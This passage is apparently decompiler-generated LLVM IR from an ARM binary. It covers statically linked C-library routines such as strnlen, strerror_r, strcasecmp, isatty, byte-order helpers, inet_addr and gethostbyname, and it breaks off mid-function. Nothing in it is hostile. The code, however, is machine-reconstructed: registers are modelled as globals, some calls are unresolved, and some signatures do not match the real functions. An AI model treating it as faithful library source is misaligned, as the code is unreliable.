  uselistorder i32 %v2_ca38, { 2, 1, 0 }
  uselistorder i32 %v1_ca28, { 1, 0 }
  uselistorder i32 %v0_ca24, { 1, 0 }
  uselistorder i32 %v6_ca18, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 3, 1, 5, 2, 0, 4 }
  uselistorder label %dec_label_pc_ca68, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_ca7c = load i32, i32* @r1, align 4
  %v2_ca7c = icmp eq i32 %v0_ca7c, 0
  br i1 %v2_ca7c, label %bb, label %dec_label_pc_caac

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_ca94:                                ; preds = %dec_label_pc_cabc
  %v3_ca94 = icmp uge i32 %v5_cb48, %v1_ca94
  %v9_ca94 = icmp eq i32 %v5_cb48, %v1_ca94
  %v2_ca98 = xor i1 %v3_ca94, true
  %v3_ca98 = or i1 %v9_ca94, %v2_ca98
  br i1 %v3_ca98, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_ca94
  %v6_ca98 = sub i32 %v5_cb48, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_ca94, %bb19
  %v5_ca9c = phi i32 [ %v1_ca94, %dec_label_pc_ca94 ], [ %v6_ca98, %bb19 ]
  %v2_ca9c = xor i1 %v9_ca94, true
  %v3_ca9c = and i1 %v3_ca94, %v2_ca9c
  br i1 %v3_ca9c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_ca9c = sub i32 %v5_ca9c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_caa0 = phi i32 [ %v5_ca9c, %bb20 ], [ %v6_ca9c, %bb21 ]
  ret i32 %v8_caa0

dec_label_pc_caa4:                                ; preds = %dec_label_pc_caf0
  br label %dec_label_pc_cb44

dec_label_pc_caac:                                ; preds = %entry
  %v2_caac = add i32 %tmp, %v0_ca7c
  %v3_caac = icmp ult i32 %v2_caac, %tmp
  br i1 %v3_caac, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_caac
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_caac, %bb23
  %v5_cb48 = phi i32 [ %v2_caac, %dec_label_pc_caac ], [ -1, %bb23 ]
  %v1_cacc2 = urem i32 %tmp, 4
  %v2_cacc3 = icmp eq i32 %v1_cacc2, 0
  br i1 %v2_cacc3, label %dec_label_pc_cad4, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %bb24, %dec_label_pc_cac8
  %v1_ca94 = phi i32 [ %v1_cac8, %dec_label_pc_cac8 ], [ %tmp, %bb24 ]
  %v1_cabc = inttoptr i32 %v1_ca94 to i8*
  %v2_cabc = load i8, i8* %v1_cabc, align 1
  %v2_cac0 = icmp eq i8 %v2_cabc, 0
  br i1 %v2_cac0, label %dec_label_pc_ca94, label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_ca94, 1
  %v1_cacc = urem i32 %v1_cac8, 4
  %v2_cacc = icmp eq i32 %v1_cacc, 0
  br i1 %v2_cacc, label %dec_label_pc_cad4, label %dec_label_pc_cabc

dec_label_pc_cad4:                                ; preds = %dec_label_pc_cac8, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_cac8, %dec_label_pc_cac8 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_cb3432 = icmp ult i32 %storemerge.lcssa, %v5_cb48
  br i1 %v3_cb3432, label %dec_label_pc_cadc, label %dec_label_pc_cb44

dec_label_pc_cadc:                                ; preds = %dec_label_pc_cb30, %dec_label_pc_cad4
  %v0_caa439 = phi i32 [ %v4_cadc, %dec_label_pc_cb30 ], [ %storemerge.lcssa, %dec_label_pc_cad4 ]
  %v1_cadc = inttoptr i32 %v0_caa439 to i32*
  %v2_cadc = load i32, i32* %v1_cadc, align 4
  %v4_cadc = add i32 %v0_caa439, 4
  store i32 %v4_cadc, i32* @lr, align 4
  %v2_cae0 = add i32 %v2_cadc, -16843009
  %v2_cae4 = and i32 %v2_cae0, -2139062144
  %v2_cae8 = icmp eq i32 %v2_cae4, 0
  br i1 %v2_cae8, label %dec_label_pc_cb30, label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cadc
  %v2_caf0 = inttoptr i32 %v0_caa439 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf8 = icmp eq i8 %v3_caf0, 0
  %v1_cafc = add i32 %v0_caa439, 1
  br i1 %v2_caf8, label %dec_label_pc_caa4, label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_caf0
  %v2_cb04 = inttoptr i32 %v1_cafc to i8*
  %v3_cb04 = load i8, i8* %v2_cb04, align 1
  %v2_cb08 = icmp eq i8 %v3_cb04, 0
  br i1 %v2_cb08, label %dec_label_pc_cb44, label %dec_label_pc_cb10

dec_label_pc_cb10:                                ; preds = %dec_label_pc_cb04
  %v1_cb10 = add i32 %v0_caa439, 2
  %v2_cb10 = inttoptr i32 %v1_cb10 to i8*
  %v3_cb10 = load i8, i8* %v2_cb10, align 1
  %v2_cb14 = icmp eq i8 %v3_cb10, 0
  br i1 %v2_cb14, label %dec_label_pc_cb44, label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cb10
  %v1_cb20 = add i32 %v0_caa439, 3
  %v2_cb20 = inttoptr i32 %v1_cb20 to i8*
  %v3_cb20 = load i8, i8* %v2_cb20, align 1
  %v2_cb24 = icmp eq i8 %v3_cb20, 0
  br i1 %v2_cb24, label %dec_label_pc_cb44, label %dec_label_pc_cb30

dec_label_pc_cb30:                                ; preds = %dec_label_pc_cb20, %dec_label_pc_cadc
  %v3_cb34 = icmp ult i32 %v4_cadc, %v5_cb48
  br i1 %v3_cb34, label %dec_label_pc_cadc, label %dec_label_pc_cb44

dec_label_pc_cb44:                                ; preds = %dec_label_pc_cb30, %dec_label_pc_cad4, %dec_label_pc_cb04, %dec_label_pc_cb10, %dec_label_pc_cb20, %dec_label_pc_caa4
  %v1_cb44 = phi i32 [ %v0_caa439, %dec_label_pc_caa4 ], [ %storemerge.lcssa, %dec_label_pc_cad4 ], [ %v1_cafc, %dec_label_pc_cb04 ], [ %v1_cb10, %dec_label_pc_cb10 ], [ %v1_cb20, %dec_label_pc_cb20 ], [ %v5_cb48, %dec_label_pc_cb30 ]
  %v3_cb44 = icmp uge i32 %v5_cb48, %v1_cb44
  %v9_cb44 = icmp eq i32 %v5_cb48, %v1_cb44
  %v2_cb48 = xor i1 %v3_cb44, true
  %v3_cb48 = or i1 %v9_cb44, %v2_cb48
  br i1 %v3_cb48, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_cb44
  %v6_cb48 = sub i32 %v5_cb48, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_cb44, %bb25
  %v5_cb4c = phi i32 [ %v1_cb44, %dec_label_pc_cb44 ], [ %v6_cb48, %bb25 ]
  %v2_cb4c = xor i1 %v9_cb44, true
  %v3_cb4c = and i1 %v3_cb44, %v2_cb4c
  br i1 %v3_cb4c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_cb4c = sub i32 %v5_cb4c, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_cb50 = phi i32 [ %v5_cb4c, %bb26 ], [ %v6_cb4c, %bb27 ]
  ret i32 %v8_cb50

; uselistorder directives
  uselistorder i1 %v3_cb44, { 1, 0 }
  uselistorder i32 %v4_cadc, { 1, 2, 0 }
  uselistorder i32 %v0_caa439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_cac8, { 1, 0, 2 }
  uselistorder i32 %v1_ca94, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_cb48, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_ca94, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_cb44, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_cabc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_cb64 = call i32 @__xpg_strerror_r()
  %v0_cb68 = load i32, i32* @r4, align 4
  ret i32 %v0_cb68
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_cb70 = load i32, i32* @r4, align 4
  %v0_cb74 = load i32, i32* @r0, align 4
  %v0_cb80 = load i32, i32* @r1, align 4
  store i32 %v0_cb80, i32* @r8, align 4
  %v0_cb84 = load i32, i32* @r2, align 4
  store i32 %v0_cb84, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_cb74, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_cbbc

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_14404.515 to i32), i32* @r5, align 4
  %v2_cba43446 = icmp eq i32 %v0_cb74, 0
  br i1 %v2_cba43446, label %bb26, label %dec_label_pc_cb98.lr.ph

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb98.lr.ph, %bb
  %v2_cbb041 = phi i1 [ %v2_cbb03849, %dec_label_pc_cb98.lr.ph ], [ %v2_cbb0, %bb ]
  %v1_cbb440 = phi i32 [ %v0_cba4.pr48, %dec_label_pc_cb98.lr.ph ], [ %v2_cba0, %bb ]
  %v0_cb9c39 = phi i32 [ %v0_cba8547, %dec_label_pc_cb98.lr.ph ], [ %v1_cb9c, %bb ]
  %v1_cb9c = add i32 %v0_cb9c39, 1
  store i32 %v1_cb9c, i32* @r5, align 4
  br i1 %v2_cbb041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_cb98
  %v2_cba0 = add i32 %v1_cbb440, -1
  %v2_cba4 = icmp eq i32 %v2_cba0, 0
  %v1_cba8 = inttoptr i32 %v1_cb9c to i8*
  %v2_cba8 = load i8, i8* %v1_cba8, align 1
  %v2_cbb0 = icmp eq i8 %v2_cba8, 0
  br i1 %v2_cba4, label %dec_label_pc_cbb0, label %dec_label_pc_cb98

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_cb98
  %v1_cba835 = inttoptr i32 %v1_cb9c to i8*
  %v2_cba836 = load i8, i8* %v1_cba835, align 1
  %v2_cbb038 = icmp eq i8 %v2_cba836, 0
  br label %dec_label_pc_cb98.lr.ph

dec_label_pc_cb98.lr.ph:                          ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_cbb03849 = phi i1 [ %v2_cbb038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_cba4.pr48 = phi i32 [ %v1_cbb440, %thread-pre-split.loopexit ], [ %v0_cb74, %thread-pre-split.preheader ]
  %v0_cba8547 = phi i32 [ %v1_cb9c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_14404.515 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_cb98

dec_label_pc_cbb0:                                ; preds = %bb
  br i1 %v2_cbb0, label %dec_label_pc_cbbc, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_cbb0
  %v0_cb9c.lcssa55 = phi i32 [ %v1_cb9c, %dec_label_pc_cbb0 ], [ ptrtoint ([8 x i8]* @global_var_14404.515 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cbb0, %entry
  %v3_cbc0 = ashr i32 %v0_cb74, 31
  %v5_cbd4 = bitcast i32* %stack_var_-25 to i8*
  %v6_cbd4 = call i32 @_uintmaxtostr(i8* %v5_cbd4, i32 %v0_cb74, i32 %v3_cbc0, i32 -10, i32 0)
  %v1_cbd8 = add i32 %v6_cbd4, -14
  store i32 %v1_cbd8, i32* @r5, align 4
  store i32 %v1_cbd8, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_143f4.517 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_cbe8 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_cbf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %bb26, %dec_label_pc_cbbc
  %v0_cbf0 = phi i32 [ %v0_cb9c.lcssa55, %bb26 ], [ %v0_cbf0.pre, %dec_label_pc_cbbc ]
  %v1_cbf0 = inttoptr i32 %v0_cbf0 to i8*
  %v3_cbf4 = call i32 @strlen(i8* %v1_cbf0)
  %v0_cbf8 = load i32, i32* @r8, align 4
  %v2_cbf8 = icmp eq i32 %v0_cbf8, 0
  %v1_cbfc = add i32 %v3_cbf4, 1
  store i32 %v1_cbfc, i32* @r4, align 4
  br i1 %v2_cbf8, label %bb27, label %dec_label_pc_cbf0._crit_edge

dec_label_pc_cbf0._crit_edge:                     ; preds = %dec_label_pc_cbf0
  %v1_cc04.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_cbf0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_cbf0._crit_edge, %bb27
  %v4_cc08 = phi i32 [ %v1_cc04.pre, %dec_label_pc_cbf0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_cbfc, %v4_cc08
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_cc08, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_cc1814 = phi i32 [ %v4_cc08, %bb29 ], [ %v1_cbfc, %bb28 ]
  %v2_cc10 = icmp eq i32 %v0_cc1814, 0
  br i1 %v2_cc10, label %dec_label_pc_cc34, label %dec_label_pc_cc18

dec_label_pc_cc18:                                ; preds = %.thread16
  store i32 %v0_cc1814, i32* @r2, align 4
  %v0_cc1c = load i32, i32* @r5, align 4
  store i32 %v0_cc1c, i32* @r1, align 4
  store i32 %v0_cbf8, i32* @r0, align 4
  %v0_cc24 = call i32 @memcpy()
  %v0_cc28 = load i32, i32* @r8, align 4
  %v1_cc28 = load i32, i32* @r4, align 4
  %v2_cc28 = add i32 %v1_cc28, %v0_cc28
  %v3_cc30 = add i32 %v2_cc28, -1
  %v4_cc30 = inttoptr i32 %v3_cc30 to i8*
  store i8 0, i8* %v4_cc30, align 1
  br label %dec_label_pc_cc34

dec_label_pc_cc34:                                ; preds = %.thread16, %dec_label_pc_cc18
  %v0_cc34 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc34 = icmp eq i32 %v0_cc34, 0
  br i1 %v2_cc34, label %dec_label_pc_cc44, label %dec_label_pc_cc3c

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cc34
  %v0_cc3c = call i32 @__errno_location()
  %v0_cc40 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc40 = inttoptr i32 %v0_cc3c to i32*
  store i32 %v0_cc40, i32* %v2_cc40, align 4
  %v0_cc44.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cc44

dec_label_pc_cc44:                                ; preds = %dec_label_pc_cc34, %dec_label_pc_cc3c
  %v0_cc44 = phi i32 [ 0, %dec_label_pc_cc34 ], [ %v0_cc44.pre, %dec_label_pc_cc3c ]
  store i32 %v3_cb70, i32* @r4, align 4
  ret i32 %v0_cc44

; uselistorder directives
  uselistorder i32 %v4_cc08, { 1, 2, 0 }
  uselistorder i32 %v1_cbfc, { 1, 0, 2 }
  uselistorder i32 %v1_cb9c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_cb74, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_cc44, { 1, 0 }
  uselistorder label %dec_label_pc_cc34, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_cbf0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %bb8, %entry
  %v8_cccc3 = phi i32 [ %v8_cccc, %bb8 ], [ 0, %entry ]
  %v0_ccc0 = phi i32 [ %v1_ccc0, %bb8 ], [ %arg2, %entry ]
  %v0_ccc4 = phi i32 [ %v1_ccc4, %bb8 ], [ %tmp, %entry ]
  %v9_cc68 = icmp eq i32 %v0_ccc4, %v0_ccc0
  br i1 %v9_cc68, label %dec_label_pc_cc68._crit_edge, label %dec_label_pc_cc70

dec_label_pc_cc68._crit_edge:                     ; preds = %dec_label_pc_cc68
  %.pre = inttoptr i32 %v0_ccc0 to i8*
  br label %bb8

dec_label_pc_cc70:                                ; preds = %dec_label_pc_cc68
  %v1_cc74 = inttoptr i32 %v0_ccc4 to i8*
  %v2_cc74 = load i8, i8* %v1_cc74, align 1
  %v3_cc74 = zext i8 %v2_cc74 to i32
  %v1_cc78 = inttoptr i32 %v0_ccc0 to i8*
  %v2_cc78 = load i8, i8* %v1_cc78, align 1
  %v3_cc78 = zext i8 %v2_cc78 to i32
  %v2_cc7c = load i32, i32* bitcast (i32** @global_var_1e7ac.519 to i32*), align 4
  %v2_cc80 = mul nuw nsw i32 %v3_cc74, 2
  store i32 %v2_cc80, i32* @ip, align 4
  %v2_cc84 = mul nuw nsw i32 %v3_cc78, 2
  %v2_cc88 = add i32 %v2_cc84, %v2_cc7c
  %v2_cc8c = add i32 %v2_cc7c, %v2_cc80
  %v1_cc90 = add i32 %v2_cc8c, 1
  %v2_cc90 = inttoptr i32 %v1_cc90 to i8*
  %v3_cc90 = load i8, i8* %v2_cc90, align 1
  %v4_cc90 = zext i8 %v3_cc90 to i32
  %v1_cc94 = add i32 %v2_cc88, 1
  %v2_cc94 = inttoptr i32 %v1_cc94 to i8*
  %v3_cc94 = load i8, i8* %v2_cc94, align 1
  %v4_cc94 = zext i8 %v3_cc94 to i32
  %v3_cc98 = inttoptr i32 %v2_cc88 to i8*
  %v4_cc98 = load i8, i8* %v3_cc98, align 1
  %v6_cc98 = zext i8 %v4_cc98 to i32
  %v3_cc9c = inttoptr i32 %v2_cc8c to i8*
  %v4_cc9c = load i8, i8* %v3_cc9c, align 1
  %v6_cc9c = zext i8 %v4_cc9c to i32
  %v3_cca0 = mul nuw i32 %v4_cc94, 16777216
  %v3_cca4 = mul nuw i32 %v4_cc90, 16777216
  %v4_cca8 = sdiv i32 %v3_cca4, 65536
  %v5_cca8 = or i32 %v6_cc9c, %v4_cca8
  %v4_ccac = sdiv i32 %v3_cca0, 65536
  %v5_ccac = or i32 %v4_ccac, %v6_cc98
  %v2_ccb0 = sub nsw i32 %v5_cca8, %v5_ccac
  %v9_ccb0 = icmp eq i32 %v5_cca8, %v5_ccac
  br i1 %v9_ccb0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_cc70
  ret i32 %v2_ccb0

bb8:                                              ; preds = %dec_label_pc_cc68._crit_edge, %dec_label_pc_cc70
  %v1_ccb8.pre-phi = phi i8* [ %.pre, %dec_label_pc_cc68._crit_edge ], [ %v1_cc74, %dec_label_pc_cc70 ]
  %v8_cccc = phi i32 [ %v8_cccc3, %dec_label_pc_cc68._crit_edge ], [ %v2_ccb0, %dec_label_pc_cc70 ]
  %v2_ccb8 = load i8, i8* %v1_ccb8.pre-phi, align 1
  %v2_ccbc = icmp eq i8 %v2_ccb8, 0
  %v1_ccc0 = add i32 %v0_ccc0, 1
  %v1_ccc4 = add i32 %v0_ccc4, 1
  store i32 %v1_ccc4, i32* @lr, align 4
  br i1 %v2_ccbc, label %dec_label_pc_cccc, label %dec_label_pc_cc68

dec_label_pc_cccc:                                ; preds = %bb8
  ret i32 %v8_cccc

; uselistorder directives
  uselistorder i32 %v1_ccc4, { 1, 0 }
  uselistorder i32 %v2_ccb0, { 1, 0 }
  uselistorder i32 %v5_ccac, { 1, 0 }
  uselistorder i32 %v5_cca8, { 1, 0 }
  uselistorder i32 %v2_cc80, { 1, 0 }
  uselistorder i32 %v0_ccc0, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_20c0c.521 to i32), i32* @r2, align 4
  %v0_ccd8 = call i32 @strtok_r()
  %v0_ccdc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ccdc, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v1_ccdc = load i32, i32* @r2, align 4
  %v2_ccdc = load i32, i32* @ip, align 4
  %v5_ccdc = mul i32 %v2_ccdc, 16777216
  %v6_ccdc = and i32 %v5_ccdc, %v1_ccdc
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_ccdc = phi i32 [ %v0_ccd8, %entry ], [ %v6_ccdc, %bb ]
  ret i32 %v7_ccdc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_cce4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_cce4, i32* @r1, align 4
  %v0_ccec = call i32 @__GI_tcgetattr()
  %v1_ccf0 = sub i32 1, %v0_ccec
  %v2_ccf0 = icmp ult i32 %v0_ccec, 2
  br i1 %v2_ccf0, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_ccfc = phi i32 [ %v1_ccf0, %entry ], [ 0, %bb ]
  ret i32 %v5_ccfc

; uselistorder directives
  uselistorder i32 %v0_ccec, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_cd00 = load i32, i32* @r4, align 4
  %v6_cd00 = load i32, i32* @r5, align 4
  %v2_cd04 = ptrtoint i32* %stack_var_-56 to i32
  %v0_cd08 = load i32, i32* @r1, align 4
  store i32 %v0_cd08, i32* %r6.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r0, align 4
  %v3_cd14 = call i32 @ioctl(i32 %v0_cd14, i32 21505, i32 %v2_cd04)
  store i32 %v3_cd14, i32* %r7.global-to-local, align 4
  %v2_cd18 = icmp eq i32 %v3_cd14, 0
  %v2_cd20 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_cd20, i32* @r1, align 4
  %v0_cd28 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_cd18, label %dec_label_pc_cd30, label %dec_label_pc_cd5c

dec_label_pc_cd30:                                ; preds = %entry
  %v1_cd28 = add i32 %v0_cd28, 17
  %v4_cd38 = zext i8 %tmp to i32
  store i32 %v4_cd38, i32* @r5, align 4
  %v2_cd3c = load i32, i32* %stack_var_-56, align 4
  %v1_cd40 = inttoptr i32 %v0_cd28 to i32*
  store i32 %v2_cd3c, i32* %v1_cd40, align 4
  %v3_cd40 = add i32 %v0_cd28, 4
  %v4_cd40 = inttoptr i32 %v3_cd40 to i32*
  %v5_cd40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_cd40, i32* %v4_cd40, align 4
  %v6_cd40 = add i32 %v0_cd28, 8
  %v7_cd40 = inttoptr i32 %v6_cd40 to i32*
  %v8_cd40 = load i32, i32* @lr, align 4
  store i32 %v8_cd40, i32* %v7_cd40, align 4
  %v0_cd44 = load i32, i32* @r4, align 4
  %v1_cd44 = load i32, i32* %r6.global-to-local, align 4
  %v2_cd44 = add i32 %v1_cd44, 12
  %v3_cd44 = inttoptr i32 %v2_cd44 to i32*
  store i32 %v0_cd44, i32* %v3_cd44, align 4
  %v0_cd48 = load i32, i32* @r5, align 4
  %v1_cd48 = trunc i32 %v0_cd48 to i8
  %v2_cd48 = load i32, i32* %r6.global-to-local, align 4
  %v3_cd48 = add i32 %v2_cd48, 16
  %v4_cd48 = inttoptr i32 %v3_cd48 to i8*
  store i8 %v1_cd48, i8* %v4_cd48, align 1
  %v4_cd4c = call i32 @__GI_mempcpy(i32 %v1_cd28, i32 %v2_cd20, i32 19, i32 %v2_cd3c)
  %v0_cd50 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_cd58 = inttoptr i32 %v4_cd4c to i8*
  %v3_cd58 = call i32 @__GI_memset(i8* %v2_cd58, i32 %v0_cd50)
  br label %dec_label_pc_cd5c

dec_label_pc_cd5c:                                ; preds = %entry, %dec_label_pc_cd30
  %v0_cd5c = phi i32 [ %v3_cd14, %entry ], [ %v0_cd50, %dec_label_pc_cd30 ]
  store i32 %v3_cd00, i32* @r4, align 4
  store i32 %v6_cd00, i32* @r5, align 4
  ret i32 %v0_cd5c

; uselistorder directives
  uselistorder i32 %v0_cd28, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_cd5c, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_cd88 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_cd88
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_cd98 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_cd9c = urem i32 %tmp1, 256
  %v5_cd9c = or i32 %v4_cd9c, %v1_cd98
  ret i32 %v5_cd9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_cdc0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_cdc0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_cdd0 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_cdd4 = urem i32 %tmp1, 256
  %v5_cdd4 = or i32 %v4_cdd4, %v1_cdd0
  ret i32 %v5_cdd4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_cde0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_cde8 = load i32, i32* @r0, align 4
  %v2_cde8 = inttoptr i32 %v0_cde8 to i8*
  %v3_cde8 = call i32 @inet_aton(i8* %v2_cde8, i32 %v2_cde0)
  %v2_cdec = icmp eq i32 %v3_cde8, 0
  br i1 %v2_cdec, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_cdf4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_cdfc = phi i32 [ -1, %entry ], [ %v3_cdf4, %bb ]
  ret i32 %v5_cdfc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_ce00 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_ce0c = call i32 @__GI___h_errno_location()
  %v2_ce10 = ptrtoint i32* %stack_var_-12 to i32
  %v0_ce1c = load i32, i32* @r4, align 4
  %v7_ce2c = call i32 @gethostbyname_r(i32 %v0_ce1c, i32* nonnull @global_var_20ddc.524, i32 ptrtoint (i32* @global_var_20c10.526 to i32), i32 460, i32 %v2_ce10, i32 %v0_ce0c)
  %v3_ce30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ce00, i32* @r4, align 4
  ret i32 %v3_ce30
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
